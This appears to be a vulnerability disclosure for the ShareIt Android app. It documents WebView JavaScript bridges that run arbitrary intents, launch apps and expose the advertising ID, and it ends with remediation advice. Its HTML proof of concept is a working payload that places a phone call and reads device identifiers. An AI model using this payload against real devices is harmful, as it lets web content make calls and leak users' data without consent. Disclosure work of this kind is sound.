
# Security Report: Insecure Intent Handling & Sensitive Information Exposure in com.lenovo.anyshare.gps (ShareIt)

## Overview
This repository documents several security weaknesses discovered in **ShareIt / com.lenovo.anyshare.gps**, including:

- Unauthenticated system event execution via `executeSystemEvent` → `yt2.b()` → `ms8.c()`.
- Ability to trigger arbitrary activities, broadcasts, and services by supplying an `intent:#Intent` URI from web content.
- Unprotected `run()` interface launching other apps.
- Exposure of GAID and device/user info directly to JavaScript interfaces.
- Combined, these issues allow hybrid WebViews or injected content to launch arbitrary actions on the device.

---

## Vulnerable Components

### 1. `WebClientActivity` & `WebClient` (JavaScript Interface)

```java
@JavascriptInterface
public void executeSystemEvent(int i, String str) {
    qy9.d("WebClientActivity", "executeSystemEvent()");
    yt2.b().b(WebClientActivity.this.V, "", i, str, false);
}

@JavascriptInterface
public void run(String str) {
    Intent launchIntentForPackage;
    qy9.d("WebClientActivity", "run() called!");
    if (!str.equalsIgnoreCase(WebClientActivity.this.V.getPackageName())
        && (launchIntentForPackage = WebClientActivity.this.V.getPackageManager().getLaunchIntentForPackage(str)) != null) {
        WebClientActivity.this.V.startActivity(launchIntentForPackage);
    }
}

@JavascriptInterface
public String getGAID() {
    return DeviceHelper.getGAID(WebClientActivity.this.V);
}
````

**Impact:**

* `executeSystemEvent()` lets any loaded HTML/JS in the embedded WebView call into `yt2.b()`, which then calls `ms8.c()` and ultimately executes **Intents** as Activities, Broadcasts or Services.
* `run()` directly launches any installed package without validation.
* `getGAID()` leaks the user’s Google Advertising ID.

---

### 2. `yt2` (Static Bridge)

```java
public class yt2 {
    public static volatile a38 f24402a;
    public static a38 b() {
        if (f24402a == null) {
            f24402a = new ms8();
        }
        return f24402a;
    }
}
```

Acts as a global singleton bridging the WebView interface to the executor implementation.

---

### 3. `ms8` (Executor)

```java
@Override
public boolean c(Context context, String str, int i, String str2, boolean z, String str3, com.ushareit.ccm.base.a aVar) {
    if (i == 1) { // Start Activity
        Intent parseUri = Intent.parseUri(str2, 0);
        parseUri.addFlags(wl5.x);
        context.startActivity(parseUri);
    } else if (i == 2) { // Send Broadcast
        context.sendBroadcast(Intent.parseUri(str2, 0));
    } else if (i == 3) { // Start Service
        context.startService(Intent.parseUri(str2, 0));
    }
}
```

**Impact:**
No input validation — any `intent:#Intent` string can be executed in multiple contexts.

---

## Proof of Concept (POC)

Below is an HTML snippet that automatically attempts both forms of the exploit (Activity and Broadcast/Service):

```html
<html>
<body>
<script>
  // Example: Launch an external dialer via Intent from JS
  // Type 1 = startActivity
  // Type 2 = sendBroadcast
  // Type 3 = startService

  // Craft the Intent URI
  var dialIntent = "intent:#Intent;action=android.intent.action.CALL;"
    + "data=tel:+15055034455;"
    + "component=com.skt.prod.dialer/com.skt.prod.dialer.activities.outgoingcall.OutgoingCallInternalBroadcaster;end";

  // Attempt as Activity
  try {
    client.executeSystemEvent(1, dialIntent);
  } catch (e) {
    print("executeSystemEvent Activity failed: " + e);
  }

  // Attempt as Broadcast/Service
  try {
    client.executeSystemEvent(2, dialIntent);
  } catch (e) {
    print("executeSystemEvent Broadcast failed: " + e);
  }

  // Launch arbitrary package
  try {
    client.run("com.some.other.package");
  } catch (e) {
    print("run() failed: " + e);
  }

  // GAID / Device Info Leak
  try {
    var gaid = client.getGAID();
    var device = client.getDeviceInfo();
    print("GAID: " + gaid);
    print("Device Info: " + device);
  } catch (e) {
    print("Leak test failed: " + e);
  }
</script>
</body>
</html>
```

This demonstrates:

* Arbitrary outgoing calls via `executeSystemEvent`.
* Arbitrary app launch via `run()`.
* GAID / device info exfiltration via `getGAID()` and `getDeviceInfo()`.

---

## Screenshots & GIF

| Screenshot                                                                                   | Description                                        |
| -------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| ![image](https://github.com/user-attachments/assets/cc14759e-6b9b-4b5c-a770-740ec431862b)    | Code path in `ms8` showing direct Intent execution |
| ![image](https://github.com/user-attachments/assets/57fc4486-564e-40ed-8f8e-4bc71c2f73bc)    | WebClientActivity bridging to `yt2.b()`            |
| ![GIF Demo](https://github.com/actuator/com.lenovo.anyshare.gps/blob/main/shareitIntent.gif) | Live demonstration of the dialer being launched    |

---

## Impact Summary

* **Remote Code Execution vector (via Intents):** Arbitrary HTML/JS can launch activities, broadcasts, or services without user consent.
* **Privacy Leakage:** GAID and device information accessible to any HTML loaded into the WebView.
* **App Misuse:** `run()` can silently launch installed apps.

---

## Recommended Remediations

* Remove or tightly restrict `executeSystemEvent` from being exposed to untrusted web content.
* Validate and whitelist Intent targets rather than parsing arbitrary URIs.
* Remove or gate `run()` functionality behind user interaction or permission checks.
* Do not expose GAID / device info directly to JavaScript without user consent.
* Add code hardening, logging, and disable risky bridges for production builds.

---

## Affected Version

Observed on **com.lenovo.anyshare.gps** current public build (ShareIt) — details redacted.

---
